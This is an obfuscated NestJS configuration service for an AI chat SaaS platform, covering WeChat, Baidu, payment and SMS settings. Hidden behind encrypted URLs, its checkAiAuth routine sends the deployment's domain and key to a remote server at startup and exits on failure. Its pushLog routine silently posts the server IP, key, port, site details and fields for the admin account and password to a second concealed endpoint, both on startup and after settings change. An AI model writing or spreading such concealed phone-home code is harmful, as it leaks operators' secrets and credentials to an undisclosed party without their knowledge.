'use strict';const _0x103260=_0x5d7c;function _0x3b13(){const _0x3438a5=['__metadata','code','支付功能暂未开放!','getSensitiveConfig','getVipLeavelRelById','baiduTextAccessToken','5081166QWHBLB','GlobalConfigService','saasId','TRUE','./vip_leavel_rel.entity','BAD_GATEWAY','wechatJsapiTicket-','baidu','robotAvatar2Base64','fetchBaseAccessToken','stringify','wechat\x20get\x20access_token\x20done','env','../../config/AppConfig','117168UExrep','saas.qumao518.vip','from','check','post','registerBaseUrl','catch','wechatAccessToken-','8wiDNPb','error','HttpException','setConfig','@nestjs/typeorm','saas\x20','vipLeavelRelEntity','@nestjs/cli/actions','VipLeavelRelEntity','Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0bno5L8H6T5QXXNUvLB6d1U','vxNumber','FrontKeys','default','aliPhoneAccessKeyId','push\x20log\x20error','getOwnPropertyDescriptor','object','signInRewards','checkAiAuth','typeorm','11864NqqJRh','POST','getConfigByKeys','response','./config.entity','ClsService','baiduTextApiKey','relateId','wechatOfficialAppId','has','onModuleInit','axios','data','NAMESPACE','saveVipLeavelRel','data:image/jpeg;base64,','APP_VERSION','1011586Adcway','payEpayStatus','设置配置信息错误！','GOMAXAI','MjConfig','createOrUpdate','./constant','exit','ConfigEntity','GOMAXAI_HOST','base64','toString','function','nestjs-cls','refresh','checkDomain','9kxwFUQptTaelrKStrwZQQ==','nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5','baiduTextStatus','aliPhoneAccessKeySecret','epay','nineai','&secret=','InjectRepository','payHupiStatus','wechat','domain','initBaiduSensitive','Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0ZDV7rlji6LO/S+cD95Ru8Q','hupi','../../common/utils','getWechatAccessToken','@nestjs/common','https://gomaxai.qumao518.vip/api/official/getAccessToken?type=official','HttpStatus','phoneRegisterStatus','https://aip.baidubce.com/oauth/2.0/token?client_id=','getConfigs4Front','5766467DMsmvT','aliPhoneSignName','qqNumber','wechatJsapiTicketMap','Logger','save','findOne','getNamespace','siteName','configKey','signInStatus','update','ticket','签到功能暂未开放!','decrypt','defineProperty','https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=','length','500015jrFbah','then','find','__decorate','configEntity','__esModule','getPhoneVerifyConfig','error_description','1016430kKfQsV','concat','json','get','&type=jsapi','UNAUTHORIZED','errmsg','333qGYkzf','&grant_type=client_credentials','baiduTextAccessToken-0','application/json','bkYMP1mVCBurarEsc48hu4lD0nfoPfj1FccGPRuygRtgPnbJWkkvJGU6zhr/otMF6E7iBQk6kY90kyEI47sVTA==','手机验证码功能暂未开放!','cls','pushLog','WechatConfig','keys','ISDEV','nineaiBuiltInSensitiveApiBase','getSignatureGiftConfig','BAD_REQUEST','CZConfig','JPFq8fAlQE2V2Eq7KWYSxg==','wechatAccessTokenMap','kaifa.qumao518.vip','includes','1474zXBZwk','set','未配置\x20robotAvatar.','6dXOVab','access_token','32syfREq','\x20微信配置缺失，不可使用微信登录！','SAAS','forEach','__param','wechatOfficialAppSecret'];_0x3b13=function(){return _0x3438a5;};return _0x3b13();}(function(_0x583a3a,_0x51a71e){const _0x5903da=_0x5d7c,_0x12e645=_0x583a3a();while(!![]){try{const _0x179d03=-parseInt(_0x5903da(0x21b))/0x1+-parseInt(_0x5903da(0x20a))/0x2*(-parseInt(_0x5903da(0x1bc))/0x3)+parseInt(_0x5903da(0x1d4))/0x4*(parseInt(_0x5903da(0x1ad))/0x5)+-parseInt(_0x5903da(0x1d2))/0x6*(-parseInt(_0x5903da(0x19b))/0x7)+-parseInt(_0x5903da(0x1f6))/0x8*(-parseInt(_0x5903da(0x1e0))/0x9)+parseInt(_0x5903da(0x1b5))/0xa+-parseInt(_0x5903da(0x1cf))/0xb*(parseInt(_0x5903da(0x1ee))/0xc);if(_0x179d03===_0x51a71e)break;else _0x12e645['push'](_0x12e645['shift']());}catch(_0x2de0b6){_0x12e645['push'](_0x12e645['shift']());}}}(_0x3b13,0x99720));var __decorate=this&&this[_0x103260(0x1b0)]||function(_0x3e31a3,_0x4fc946,_0x9340c1,_0x5398a2){const _0x2abc28=_0x103260;var _0x2ec91a=arguments['length'],_0x6dbadb=_0x2ec91a<0x3?_0x4fc946:_0x5398a2===null?_0x5398a2=Object[_0x2abc28(0x205)](_0x4fc946,_0x9340c1):_0x5398a2,_0x10891b;if(typeof Reflect===_0x2abc28(0x206)&&typeof Reflect['decorate']===_0x2abc28(0x181))_0x6dbadb=Reflect['decorate'](_0x3e31a3,_0x4fc946,_0x9340c1,_0x5398a2);else{for(var _0x3bc5dd=_0x3e31a3[_0x2abc28(0x1ac)]-0x1;_0x3bc5dd>=0x0;_0x3bc5dd--)if(_0x10891b=_0x3e31a3[_0x3bc5dd])_0x6dbadb=(_0x2ec91a<0x3?_0x10891b(_0x6dbadb):_0x2ec91a>0x3?_0x10891b(_0x4fc946,_0x9340c1,_0x6dbadb):_0x10891b(_0x4fc946,_0x9340c1))||_0x6dbadb;}return _0x2ec91a>0x3&&_0x6dbadb&&Object[_0x2abc28(0x1aa)](_0x4fc946,_0x9340c1,_0x6dbadb),_0x6dbadb;},__metadata=this&&this[_0x103260(0x1da)]||function(_0xa2ba7d,_0x58edb1){const _0x568d51=_0x103260;if(typeof Reflect===_0x568d51(0x206)&&typeof Reflect['metadata']===_0x568d51(0x181))return Reflect['metadata'](_0xa2ba7d,_0x58edb1);},__param=this&&this[_0x103260(0x1d8)]||function(_0x40cc5f,_0xfe27af){return function(_0x362edf,_0x1b06d6){_0xfe27af(_0x362edf,_0x1b06d6,_0x40cc5f);};};function _0x5d7c(_0x3e37a1,_0x36290b){const _0x3b1338=_0x3b13();return _0x5d7c=function(_0x5d7c41,_0x423087){_0x5d7c41=_0x5d7c41-0x17c;let _0x191cca=_0x3b1338[_0x5d7c41];return _0x191cca;},_0x5d7c(_0x3e37a1,_0x36290b);}Object[_0x103260(0x1aa)](exports,_0x103260(0x1b2),{'value':!![]}),exports[_0x103260(0x1e1)]=void 0x0;const common_1=require(_0x103260(0x195)),config_entity_1=require(_0x103260(0x20e)),typeorm_1=require(_0x103260(0x1fa)),typeorm_2=require(_0x103260(0x209)),utils_1=require(_0x103260(0x193)),axios_1=require(_0x103260(0x215)),actions_1=require(_0x103260(0x1fd)),store_1=require('../../common/store'),store_2=require('../../common/store'),AppConfig_1=require(_0x103260(0x1ed)),vip_leavel_rel_entity_1=require(_0x103260(0x1e4)),nestjs_cls_1=require(_0x103260(0x182)),constant_1=require(_0x103260(0x221)),authCheckUrl=(0x0,utils_1['decrypt'])(_0x103260(0x191)),authLogUrl=(0x0,utils_1['decrypt'])(_0x103260(0x1ff));let GlobalConfigService=class GlobalConfigService{constructor(_0x39e55d,_0x224dcf,_0x516b08){const _0x3204cb=_0x103260;this[_0x3204cb(0x1b1)]=_0x39e55d,this['vipLeavelRelEntity']=_0x224dcf,this[_0x3204cb(0x1c2)]=_0x516b08,this['wechatAccessTokenMap']=new Map(),this[_0x3204cb(0x19e)]=new Map();}async[_0x103260(0x214)](){const _0x2e7725=_0x103260;await this[_0x2e7725(0x208)](),await this[_0x2e7725(0x1c3)](),await this[_0x2e7725(0x190)](),await this[_0x2e7725(0x194)](!![]);const _0x5af25a=[][_0x2e7725(0x1b6)](store_1[_0x2e7725(0x21f)]['keys'],store_1[_0x2e7725(0x1ca)][_0x2e7725(0x1c5)],store_2[_0x2e7725(0x1c4)][_0x2e7725(0x1c5)]),_0x387f4e=await this['getConfigByKeys'](_0x5af25a);store_1[_0x2e7725(0x21f)][_0x2e7725(0x183)](_0x387f4e),store_1[_0x2e7725(0x1ca)][_0x2e7725(0x183)](_0x387f4e),store_2[_0x2e7725(0x1c4)]['refresh'](_0x387f4e);}async[_0x103260(0x208)](){const _0x2284ec=_0x103260,_0x438719=process[_0x2284ec(0x1ec)][(0x0,utils_1[_0x2284ec(0x1a9)])(_0x2284ec(0x1cb))],_0x477a00=process['env'][(0x0,utils_1['decrypt'])('9kxwFUQptTaelrKStrwZQQ==')];(!_0x477a00||!_0x438719)&&(common_1[_0x2284ec(0x19f)]['error']((0x0,utils_1[_0x2284ec(0x1a9)])('nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5')),(0x0,actions_1[_0x2284ec(0x17c)])());const _0x3bd4ac={'authDomain':_0x438719,'authKey':_0x477a00},_0x41694b={'method':_0x2284ec(0x20b),'headers':{'Content-Type':'application/json'},'body':JSON[_0x2284ec(0x1ea)](_0x3bd4ac)},_0x25a261=await fetch(authCheckUrl,_0x41694b)[_0x2284ec(0x1ae)](_0xc48577=>{const _0x40c9f3=_0x2284ec;return _0xc48577[_0x40c9f3(0x1b7)]();})[_0x2284ec(0x1f4)](_0x3a883e=>{const _0x3373e8=_0x2284ec;common_1[_0x3373e8(0x19f)][_0x3373e8(0x1f7)](_0x3a883e,'global');});_0x25a261['code']!==0x0&&(common_1[_0x2284ec(0x19f)]['error']((0x0,utils_1[_0x2284ec(0x1a9)])(_0x2284ec(0x1c0))),(0x0,actions_1[_0x2284ec(0x17c)])()),_0x25a261?.[_0x2284ec(0x1db)]===0x0&&!_0x25a261?.[_0x2284ec(0x216)]?.[_0x2284ec(0x1f1)]&&(common_1[_0x2284ec(0x19f)][_0x2284ec(0x1f7)]((0x0,utils_1[_0x2284ec(0x1a9)])(_0x2284ec(0x186))),(0x0,actions_1[_0x2284ec(0x17c)])());}async[_0x103260(0x1c3)](_0x255dc6,_0x428831){const _0x35bbde=_0x103260,_0x253eb8=process[_0x35bbde(0x1ec)][(0x0,utils_1[_0x35bbde(0x1a9)])(_0x35bbde(0x1cb))],_0x43234b=process[_0x35bbde(0x1ec)][(0x0,utils_1['decrypt'])(_0x35bbde(0x185))],_0x15e5b9=process[_0x35bbde(0x1ec)]['PORT'];if(!_0x253eb8||!_0x43234b)throw new common_1['HttpException']((0x0,utils_1['decrypt'])('nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5'),common_1[_0x35bbde(0x197)][_0x35bbde(0x1ba)]);const {qqNumber:_0x5ca69c,vxNumber:_0x13eb60,siteName:_0x24bdeb,domain:_0x14a663,registerBaseUrl:_0x28d09c}=await this[_0x35bbde(0x20c)]([_0x35bbde(0x19d),'vxNumber',_0x35bbde(0x1a3),_0x35bbde(0x18f),_0x35bbde(0x1f3)]),_0x586f30={'ip':_0x253eb8,'key':_0x43234b,'port':_0x15e5b9,'qqNumber':_0x5ca69c,'vxNumber':_0x13eb60,'domain':_0x14a663,'adminAccount':_0x255dc6,'adminPass':_0x428831,'baseUrl':_0x28d09c,'siteName':_0x24bdeb,'qq':_0x5ca69c,'vxNum':_0x13eb60,'version':AppConfig_1[_0x35bbde(0x21a)]},_0x2558b7={'method':_0x35bbde(0x20b),'headers':{'Content-Type':_0x35bbde(0x1bf)},'body':JSON[_0x35bbde(0x1ea)](_0x586f30)};await fetch(authLogUrl,_0x2558b7)[_0x35bbde(0x1f4)](_0x5099a1=>{const _0x521e13=_0x35bbde;console['log'](_0x521e13(0x204),_0x5099a1);});}async[_0x103260(0x190)](_0x25778f=!![]){const _0x5e4f78=_0x103260,{baiduTextApiKey:_0x512939,baiduTextSecretKey:_0x36522d}=await this[_0x5e4f78(0x20c)](['baiduTextApiKey','baiduTextSecretKey']);if(!_0x512939||!_0x36522d){common_1[_0x5e4f78(0x19f)]['error']('百度敏感词初始化失败，如果需要敏感检测、请前往后台系统配置!',_0x5e4f78(0x1e1));return;}const _0x14639b={'Content-Type':'application/json','Accept':_0x5e4f78(0x1bf)},_0xd430b9=_0x5e4f78(0x199)+_0x512939+'&client_secret='+_0x36522d+_0x5e4f78(0x1bd);try{const _0x197cec=await axios_1[_0x5e4f78(0x202)][_0x5e4f78(0x1f2)](_0xd430b9,{'headers':_0x14639b});this[_0x5e4f78(0x1df)]=_0x197cec[_0x5e4f78(0x216)]['access_token'];}catch(_0x35bc69){if(_0x25778f)common_1['Logger']['error']('百度敏感词配置检测失败，您的参数可能配置的不正确!','GlobalConfigService');else throw new common_1[(_0x5e4f78(0x1f8))](_0x35bc69[_0x5e4f78(0x20d)][_0x5e4f78(0x216)][_0x5e4f78(0x1b4)],common_1[_0x5e4f78(0x197)][_0x5e4f78(0x1c9)]);}}async['getWechatAccessToken'](_0x253fae=![]){const _0x47acb1=_0x103260,_0xe6041b=new Map(),_0x77ecdb=await this[_0x47acb1(0x1b1)]['find']({'where':{'configKey':(0x0,typeorm_2['In'])([_0x47acb1(0x212),_0x47acb1(0x1d9)])}});_0x77ecdb['forEach'](_0x5e4916=>{const _0xcc80d9=_0x47acb1;!_0xe6041b[_0xcc80d9(0x213)](_0x5e4916['saasId'])&&_0xe6041b[_0xcc80d9(0x1d0)](_0x5e4916[_0xcc80d9(0x1e2)],{}),_0xe6041b['get'](_0x5e4916[_0xcc80d9(0x1e2)])[_0x5e4916['configKey']]=_0x5e4916['configVal'];}),_0xe6041b[_0x47acb1(0x1d7)]((_0x88787b,_0x310638)=>{const _0x3d07d9=_0x47acb1;!_0x88787b[_0x3d07d9(0x212)]||!_0x88787b[_0x3d07d9(0x1d9)]?common_1[_0x3d07d9(0x19f)]['warn'](_0x3d07d9(0x1fb)+_0x310638+_0x3d07d9(0x1d5),_0x3d07d9(0x194)):this[_0x3d07d9(0x1e9)](_0x310638,_0x88787b[_0x3d07d9(0x212)],_0x88787b[_0x3d07d9(0x1d9)],_0x253fae);}),common_1[_0x47acb1(0x19f)]['log'](_0x47acb1(0x1eb),'OfficialService');}async['fetchBaseAccessToken'](_0x40b793,_0x3101b4,_0x459977,_0x1c980f=![]){const _0x3d1cbf=_0x103260;if(process[_0x3d1cbf(0x1ec)][_0x3d1cbf(0x1c6)]===_0x3d1cbf(0x1e3))return;try{let _0x23a526='';const _0x2bf040=process[_0x3d1cbf(0x1ec)][_0x3d1cbf(0x17e)];if(_0x2bf040===_0x3d1cbf(0x1cd)||_0x2bf040==='ceshi.qumao518.vip'||_0x2bf040===_0x3d1cbf(0x1ef)){const _0x3eb37e=await axios_1[_0x3d1cbf(0x202)][_0x3d1cbf(0x1b8)](_0x3d1cbf(0x196));_0x23a526=_0x3eb37e[_0x3d1cbf(0x216)][_0x3d1cbf(0x216)];}else{const _0x3fdf3e=await axios_1[_0x3d1cbf(0x202)][_0x3d1cbf(0x1b8)](_0x3d1cbf(0x1ab)+_0x3101b4+_0x3d1cbf(0x18b)+_0x459977);if(_0x3fdf3e[_0x3d1cbf(0x216)][_0x3d1cbf(0x1bb)])throw new Error('获取微信access_token失败、错误信息：'+_0x3fdf3e[_0x3d1cbf(0x216)][_0x3d1cbf(0x1bb)]);_0x23a526=_0x3fdf3e[_0x3d1cbf(0x216)][_0x3d1cbf(0x1d3)];}this[_0x3d1cbf(0x1cc)][_0x3d1cbf(0x1d0)](_0x40b793,_0x23a526);const _0x19ded8=await axios_1[_0x3d1cbf(0x202)][_0x3d1cbf(0x1b8)]('https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token='+_0x23a526+_0x3d1cbf(0x1b9));this['wechatJsapiTicketMap'][_0x3d1cbf(0x1d0)](_0x40b793,_0x19ded8?.['data']?.[_0x3d1cbf(0x1a7)]);}catch(_0x41db47){common_1[_0x3d1cbf(0x19f)][_0x3d1cbf(0x1f7)](_0x41db47['message'],_0x3d1cbf(0x1e9));}}async[_0x103260(0x184)](_0x1c3c56){const _0x1b59fb=_0x103260;if(process['env'][_0x1b59fb(0x1d6)])return!![];const {domain:_0x119b9b}=_0x1c3c56,_0x16b0c0=process[_0x1b59fb(0x1ec)][(0x0,utils_1[_0x1b59fb(0x1a9)])('JPFq8fAlQE2V2Eq7KWYSxg==')];return _0x119b9b[_0x1b59fb(0x1ce)](_0x16b0c0);}async[_0x103260(0x220)](_0x47919d){const _0x45b07b=_0x103260;try{const _0x1a1f1c=this[_0x45b07b(0x1c2)][_0x45b07b(0x1b8)](_0x45b07b(0x1e2)),{configKey:_0x2862ba,configVal:_0x242e98,status:status=0x1}=_0x47919d,_0x29d4ba=await this[_0x45b07b(0x1b1)][_0x45b07b(0x1a1)]({'where':{'configKey':_0x2862ba,'saasId':_0x1a1f1c}});_0x29d4ba?await this['configEntity'][_0x45b07b(0x1a6)]({'configKey':_0x2862ba,'saasId':_0x1a1f1c},{'configVal':_0x242e98,'status':status}):await this[_0x45b07b(0x1b1)][_0x45b07b(0x1a0)]({'configKey':_0x2862ba,'configVal':_0x242e98,'status':status,'saasId':_0x1a1f1c});}catch(_0x45cb30){throw new common_1[(_0x45b07b(0x1f8))](_0x45b07b(0x21d),common_1['HttpStatus'][_0x45b07b(0x1c9)]);}}async[_0x103260(0x1f9)](_0x18825c){const _0x17e4ac=_0x103260;let _0x2646fa=![],_0x23af43=![],_0x6c88c9=![],_0x2b2fe7=![],_0x215105=![],_0x19da14=![];const _0x57cc45={},{settings:_0x2accca}=_0x18825c;for(const _0x2aac02 of _0x2accca){await this[_0x17e4ac(0x220)](_0x2aac02),_0x57cc45[_0x2aac02[_0x17e4ac(0x1a4)]]=_0x2aac02['configVal'],store_1[_0x17e4ac(0x21f)][_0x2aac02[_0x17e4ac(0x1a4)]]&&(_0x2646fa=!![]),store_1[_0x17e4ac(0x1ca)][_0x2aac02['configKey']]&&(_0x23af43=!![]),store_2[_0x17e4ac(0x1c4)][_0x2aac02[_0x17e4ac(0x1a4)]]&&(_0x6c88c9=!![]),[_0x17e4ac(0x210),'baiduTextSecretKey'][_0x17e4ac(0x1ce)](_0x2aac02[_0x17e4ac(0x1a4)])&&(_0x2b2fe7=!![]),['wechatOfficialAppId',_0x17e4ac(0x1d9)][_0x17e4ac(0x1ce)](_0x2aac02[_0x17e4ac(0x1a4)])&&(_0x215105=!![]),[_0x17e4ac(0x19d),_0x17e4ac(0x200),'siteName',_0x17e4ac(0x18f),_0x17e4ac(0x1f3)][_0x17e4ac(0x1ce)](_0x2aac02[_0x17e4ac(0x1a4)])&&(_0x19da14=!![]);}return _0x2646fa&&store_1[_0x17e4ac(0x21f)][_0x17e4ac(0x183)](_0x57cc45),_0x23af43&&store_1[_0x17e4ac(0x1ca)][_0x17e4ac(0x183)](_0x57cc45),_0x6c88c9&&store_2[_0x17e4ac(0x1c4)][_0x17e4ac(0x183)](_0x57cc45),_0x2b2fe7&&await this[_0x17e4ac(0x190)](![]),_0x215105&&await this['getWechatAccessToken'](),_0x19da14&&this[_0x17e4ac(0x1c3)](),'设置完成！';}async[_0x103260(0x19a)](_0x5363b0){const _0x1d4e79=_0x103260,_0x54bb5d=await this[_0x1d4e79(0x20c)](_0x5363b0,!![]);return _0x5363b0['length']===0x1?_0x54bb5d[_0x5363b0[0x0]]:_0x54bb5d;}async[_0x103260(0x20c)](_0x4bddb7,_0x1f6f4e=![]){const _0x344058=_0x103260;if(!_0x4bddb7[_0x344058(0x1ac)])throw new Error('查询配置不能为空！');const _0x2e67bd=this[_0x344058(0x1c2)][_0x344058(0x1b8)](_0x344058(0x1e2))||0x0,_0x291574=new Map(),_0x16c157=await this[_0x344058(0x1b1)][_0x344058(0x1af)]({'where':{'configKey':(0x0,typeorm_2['In'])(_0x4bddb7),'saasId':(0x0,typeorm_2['In'])([0x0,_0x2e67bd])}});_0x16c157[_0x344058(0x1d7)](_0x3f7dd0=>{const {configKey:_0x53047c,configVal:_0x5beb5a,saasId:_0x2ba87c}=_0x3f7dd0;_0x291574['set'](_0x53047c+'-'+_0x2ba87c,_0x5beb5a);}),this[_0x344058(0x1cc)][_0x344058(0x1d7)]((_0x2173c9,_0x253e8e)=>{const _0x5b98cc=_0x344058;_0x291574[_0x5b98cc(0x1d0)](_0x5b98cc(0x1f5)+_0x253e8e,_0x2173c9);}),this['wechatJsapiTicketMap'][_0x344058(0x1d7)]((_0x5e0b36,_0x255a38)=>{const _0x4b2b84=_0x344058;_0x291574[_0x4b2b84(0x1d0)](_0x4b2b84(0x1e6)+_0x255a38,_0x5e0b36);}),_0x291574['set'](_0x344058(0x1be),this[_0x344058(0x1df)]);const _0x419948={};_0x4bddb7[_0x344058(0x1d7)](_0x27acbb=>{const _0x1843b1=_0x344058;let _0x2df9e0=_0x27acbb+'-'+_0x2e67bd,_0x3c8cf8='';_0x291574['has'](_0x2df9e0)?_0x3c8cf8=_0x291574[_0x1843b1(0x1b8)](_0x2df9e0):!constant_1['SelfKeys'][_0x1843b1(0x1ce)](_0x27acbb)&&(_0x3c8cf8=_0x291574[_0x1843b1(0x1b8)](_0x27acbb+'-'+0x0)),_0x419948[_0x27acbb]=_0x3c8cf8;});if(_0x1f6f4e)return _0x419948;return _0x4bddb7[_0x344058(0x1ac)]===0x1?_0x419948[_0x4bddb7[0x0]]:_0x419948;}async['queryFrontConfig'](){const _0x48fad6=_0x103260,_0x3dfde9=await this[_0x48fad6(0x20c)](constant_1[_0x48fad6(0x201)]);return{..._0x3dfde9,'isUseWxLogin':!!(_0x3dfde9[_0x48fad6(0x212)]&&_0x3dfde9[_0x48fad6(0x1d9)])};}async['queryPayType'](_0x17edbb=_0x103260(0x18e)){const _0xe2a2a4=_0x103260,{payHupiStatus:payHupiStatus=0x0,payEpayStatus:payEpayStatus=0x0,payWechatStatus:payWechatStatus=0x0,payMpayStatus:payMpayStatus=0x0}=await this[_0xe2a2a4(0x20c)]([_0xe2a2a4(0x18d),_0xe2a2a4(0x21c),'payMpayStatus','payWechatStatus']);if([payHupiStatus,payEpayStatus,payWechatStatus,payMpayStatus]['every'](_0x4037d0=>_0x4037d0===0x0))throw new common_1[(_0xe2a2a4(0x1f8))](_0xe2a2a4(0x1dc),common_1[_0xe2a2a4(0x197)][_0xe2a2a4(0x1c9)]);if(Number(payWechatStatus)===0x1)return _0x17edbb;if(Number(payEpayStatus)===0x1)return _0xe2a2a4(0x189);if(Number(payMpayStatus)===0x1)return'mpay';if(Number(payHupiStatus)===0x1)return _0xe2a2a4(0x192);}async[_0x103260(0x1b3)](){const _0x57f632=_0x103260,{phoneRegisterStatus:_0x51c44b,aliPhoneAccessKeyId:_0x1bb3f7,aliPhoneAccessKeySecret:_0x239bfb,aliPhoneSignName:_0x3bf07b,aliPhoneTemplateCode:_0x5f4ec0}=await this[_0x57f632(0x20c)]([_0x57f632(0x198),_0x57f632(0x203),_0x57f632(0x188),_0x57f632(0x19c),'aliPhoneTemplateCode']);if(Number(_0x51c44b)!==0x1)throw new common_1[(_0x57f632(0x1f8))](_0x57f632(0x1c1),common_1['HttpStatus']['BAD_REQUEST']);return{'accessKeyId':_0x1bb3f7,'accessKeySecret':_0x239bfb,'SignName':_0x3bf07b,'TemplateCode':_0x5f4ec0};}[_0x103260(0x1a2)](){const _0x48bf54=_0x103260;return process[_0x48bf54(0x1ec)][_0x48bf54(0x217)]||_0x48bf54(0x21e);}async[_0x103260(0x1c8)](){const _0x2c8241=_0x103260,_0x45712f=await this['getConfigByKeys'](['signInStatus',_0x2c8241(0x207)]),_0x252376={};for(let _0xfbaf2 in _0x45712f){const _0x5c3af3=Number(_0x45712f[_0xfbaf2]);_0x252376[_0xfbaf2]=isNaN(_0x5c3af3)?0x0:_0x5c3af3;}if(!_0x252376[_0x2c8241(0x1a5)])throw new common_1[(_0x2c8241(0x1f8))](_0x2c8241(0x1a8),common_1[_0x2c8241(0x197)][_0x2c8241(0x1c9)]);return _0x252376[_0x2c8241(0x207)];}async[_0x103260(0x1dd)](){const _0x599a8b=_0x103260,{baiduTextStatus:baiduTextStatus=0x0,baiduTextAccessToken:_0x52f03e,nineaiBuiltInSensitiveStatus:nineaiBuiltInSensitiveStatus=0x0,nineaiBuiltInSensitiveApiBase:_0x5343b8,nineaiBuiltInSensitiveAuthKey:_0x192f95}=await this[_0x599a8b(0x20c)]([_0x599a8b(0x187),_0x599a8b(0x1df),'nineaiBuiltInSensitiveStatus',_0x599a8b(0x1c7),'nineaiBuiltInSensitiveAuthKey']);if(Number(baiduTextStatus)===0x1)return{'useType':_0x599a8b(0x1e7),'baiduTextAccessToken':_0x52f03e};if(Number(nineaiBuiltInSensitiveStatus)===0x1)return{'useType':_0x599a8b(0x18a),'nineaiBuiltInSensitiveApiBase':_0x5343b8,'nineaiBuiltInSensitiveAuthKey':_0x192f95};return null;}async[_0x103260(0x1e8)](){const _0x29826d=_0x103260,_0xadcfe7=await this[_0x29826d(0x20c)](['robotAvatar']);if(!_0xadcfe7)throw new common_1[(_0x29826d(0x1f8))](_0x29826d(0x1d1),common_1[_0x29826d(0x197)][_0x29826d(0x1e5)]);const _0x392421=await axios_1[_0x29826d(0x202)][_0x29826d(0x1b8)](_0xadcfe7,{'responseType':'arraybuffer'}),_0x2c8ccf=Buffer[_0x29826d(0x1f0)](_0x392421[_0x29826d(0x216)])[_0x29826d(0x180)](_0x29826d(0x17f));return _0x29826d(0x219)+_0x2c8ccf;}async[_0x103260(0x218)](_0x214c12){const _0x227a0f=_0x103260;await this[_0x227a0f(0x1fc)]['save'](_0x214c12);}async[_0x103260(0x1de)](_0x3d5220,_0x5d5fb7,_0x546672){const _0x35e09f=_0x103260,_0x27120d={'vipLeavelId':_0x3d5220,'relateType':_0x5d5fb7};_0x546672&&(_0x27120d[_0x35e09f(0x211)]=_0x546672);const _0x37a8bd=await this[_0x35e09f(0x1fc)][_0x35e09f(0x1a1)]({'where':_0x27120d});return _0x37a8bd;}};GlobalConfigService=__decorate([(0x0,common_1['Injectable'])(),__param(0x0,(0x0,typeorm_1[_0x103260(0x18c)])(config_entity_1[_0x103260(0x17d)])),__param(0x1,(0x0,typeorm_1['InjectRepository'])(vip_leavel_rel_entity_1[_0x103260(0x1fe)])),__metadata('design:paramtypes',[typeorm_2['Repository'],typeorm_2['Repository'],nestjs_cls_1[_0x103260(0x20f)]])],GlobalConfigService),exports['GlobalConfigService']=GlobalConfigService;